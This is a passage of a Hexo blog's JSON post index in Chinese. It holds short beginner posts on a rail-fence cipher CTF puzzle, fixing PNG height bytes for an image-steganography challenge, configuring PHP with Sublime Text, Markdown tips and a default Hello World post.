为反序列化。 serialize实例运行结果： unseialize实例运行结果：","categories":[],"tags":[]},{"title":"一道简单密码的栅栏","slug":"一道简单密码的栅栏","date":"2020-04-20T07:02:19.633Z","updated":"2020-04-20T07:02:15.954Z","comments":true,"path":"2020/04/20/一道简单密码的栅栏/","link":"","permalink":"https://zc1109.github.io/2020/04/20/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E7%9A%84%E6%A0%85%E6%A0%8F/","excerpt":"栅栏密码属于古典密码中最经典的移项式密码，","text":"栅栏密码属于古典密码中最经典的移项式密码，与凯撒密码等替换式密码代表了密码学中最重要的两个概念（扩散和混淆）以题为例：篱笆墙，想必大家直接就能联想到栅栏，解压压缩包得到这样一串字符，长度为26；因为26=2*13，所以可以分为2、13栏，这里我们以13栏为例，每隔2个字符进行分割便得到：第一栏：flag{wethinkw第二栏：ehavetheflag}连接起来就得到flag了：flag{wethinkwehavetheflag}","categories":[],"tags":[]},{"title":"CTF--图片隐写之修改图片宽和高","slug":"CTF--图片隐写之修改图片宽和高","date":"2020-04-05T05:17:53.188Z","updated":"2020-04-05T05:17:42.672Z","comments":true,"path":"2020/04/05/CTF--图片隐写之修改图片宽和高/","link":"","permalink":"https://zc1109.github.io/2020/04/05/CTF--%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E4%B9%8B%E4%BF%AE%E6%94%B9%E5%9B%BE%E7%89%87%E5%AE%BD%E5%92%8C%E9%AB%98/","excerpt":"这也是做图片杂项时前几步需要考虑的，有时没有任何线索就去修改宽高","text":"这也是做图片杂项时前几步需要考虑的，有时没有任何线索就去修改宽高比如我们拿到这样一个图片)一看这个图片就明显缺失了一部分，直接去修改图片的宽和高，查看一下图片的宽高：1119*512。将1119转换成16进制为45f，512转换成16进制就是200，把图片拉进winhex里边:找到宽和高代表的16进制码，其实第二行开始的00 00 04 5F 代表的就是宽，00 00 02 00代表的是高，这张图片明显高不足，那么直接将02 00 改为宽代表的16进制码，即04 5F，改完之后直接Ctrl+s保存，再打开直接看到了flag。","categories":[],"tags":[]},{"title":"PHP环境变量配置以及sublime text（PHP编译器）配置php环境","slug":"PHP环境变量配置以及sublime text（PHP编译器）配置php环境","date":"2020-04-05T04:14:54.587Z","updated":"2020-04-05T04:14:49.765Z","comments":true,"path":"2020/04/05/PHP环境变量配置以及sublime text（PHP编译器）配置php环境/","link":"","permalink":"https://zc1109.github.io/2020/04/05/PHP%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Asublime%20text%EF%BC%88PHP%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%89%E9%85%8D%E7%BD%AEphp%E7%8E%AF%E5%A2%83/","excerpt":"PHP环境安装及配置比较适合的还是phpstudy，直接官网下载就可以，版本不能太高。","text":"PHP环境安装及配置比较适合的还是phpstudy，直接官网下载就可以，版本不能太高。 安装好之后需要配置环境变量path：右击 “电脑”–属性–&gt;高级系统设置–&gt;环境变量–&gt;打开用户变量和系统变量里的path。随后需要在电脑环境中添加php.exe所在位置。箭头所指的就是我自己的php.exe所在位置，添加好之后点击确定。最后确认一下是否安装成功：windows+r 输入cmd打开命令函，输入php-v这样就算是配置成功！！ sublime text中配置PHP打开sublime text ，找到New build System，打开。之后会出现这样的代码：将里面的代码改为： { &quot;cmd&quot;:[&quot;php&quot;,&quot;$file&quot;], &quot;file_regex&quot;:&quot;php$&quot;, &quot;selector&quot;:&quot;source.php&quot; } 然后Ctrl+s保存到默认目录下，修改文件名为：php.sublime-build再新建一个文件，直接可以写代码了，保存代码的时候文件要加后缀名.phpCtrl+B即可运行代码！","categories":[],"tags":[]},{"title":"写hexo博客时好用的工具！(1)","slug":"写hexo博客时好用的工具！(1)","date":"2020-03-01T06:05:13.131Z","updated":"2020-03-01T06:04:47.868Z","comments":true,"path":"2020/03/01/写hexo博客时好用的工具！(1)/","link":"","permalink":"https://zc1109.github.io/2020/03/01/%E5%86%99hexo%E5%8D%9A%E5%AE%A2%E6%97%B6%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%81(1)/","excerpt":"","text":"在这里给大家推荐一个好用的工具，链接放在下边了！Marxio 1）设置标题：用“#”的个数来控制标题大小，”#”越多标题就越小。 2）列表：在列表前边加”- “(减号+空格)，如图：3）列表：数字+英文输入法下的句号也可以。4）图片：!+[]+() ，中括号相当于一个说明，不会显示出来，小括号里边放图片地址就可以了.(英文输入法下才可以，”+“不用写上，这里只是为了让大家看得更清楚。)5）超文本链接：[]+() 例如百度： 在博客上就会显示为”baidu”的字样，点击便会跳转。6）文字加粗：在文字两边各加两个“ ** ”就可以了。7）斜体：在文字两边各加一个“ * ”就可以了。8）调节文字样式、颜色、字体：在博客中就显示为： 9）文字居中:10）文字居右：居左的话将”right“改为”left“即可。11）引用样式：&gt;加空格即可。","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-02-15T20:15:45.092Z","updated":"2020-02-15T20:15:45.092Z","comments":true,"path":"2020/02/16/hello-world/","link":"","permalink":"https://zc1109.github.io/2020/02/16/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}